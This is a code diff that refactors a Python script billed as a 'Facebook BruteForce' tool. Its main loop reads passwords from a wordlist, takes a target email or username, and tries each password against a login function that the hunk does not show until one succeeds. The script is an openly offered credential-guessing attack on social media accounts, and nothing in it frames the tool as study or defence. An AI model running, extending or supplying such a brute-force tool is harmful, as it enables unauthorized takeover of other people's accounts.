@@ -54,19 +54,19 @@ def function(email, passw, i):
 
 
 print("\n---------- Welcome To Facebook BruteForce ----------\n")
-file = open("passwords.txt", "r")
-
-email = input("Enter Email/Username : ")
-
-print("\nTarget Email ID : ", email)
-print("\nTrying Passwords from list ...")
-
-i = 0
-while file:
-    passw = file.readline().strip()
-    i += 1
-    if len(passw) < 6:
-        continue
-    print(str(i) + " : ", passw)
-    if function(email, passw, i):
-        break
+with open("passwords.txt", "r") as file:
+    
+    email = input("Enter Email/Username : ")
+    
+    print("\nTarget Email ID : ", email)
+    print("\nTrying Passwords from list ...")
+    
+    i = 0
+    while file:
+        passw = file.readline().strip()
+        i += 1
+        if len(passw) < 6:
+            continue
+        print(str(i) + " : ", passw)
+        if function(email, passw, i):
+            break
